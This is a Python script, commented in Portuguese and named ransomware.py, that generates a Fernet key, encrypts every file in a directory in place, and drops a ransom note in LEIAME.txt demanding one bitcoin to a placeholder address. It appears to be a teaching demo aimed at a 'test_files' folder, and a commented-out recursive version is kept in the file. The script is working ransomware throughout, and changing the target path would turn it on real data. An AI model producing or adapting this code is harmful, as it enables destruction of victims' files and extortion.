from cryptography.fernet import Fernet
import os

# gerar chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# carregar chave salva

def carregar_chave():
    return open("chave.key", "rb").read()

# criptografia de arquivo único

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# encontrar arquivos para encriptografar

#def encontrar_arquivos(diretorio):
#    lista = []
#    for raiz, _, arquivos in os.walk(diretorio):
#        for nome in arquivos:
#            caminho = os.path.join(raiz, nome)
#            if nome != "ransomware.py" and not nome.endswith(".key"):
#                lista.append(caminho)
#    return lista

def encontrar_arquivos(diretorio):
    lista = []
    for nome in os.listdir(diretorio):
        caminho = os.path.join(diretorio, nome)
        if os.path.isfile(caminho) and nome != "ransomware.py" and not nome.endswith(".key"):
            lista.append(caminho)
    return lista

# mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIAME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!!\n")
        f.write("Envie 1 bitcoin para o endereço XPTO com o comprovante\n")
        f.write("Depois desta etapa enviaremos a chave para recuperar os dados\n")

# Execução do código

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos Criptografados!")

if __name__=="__main__":
    main()
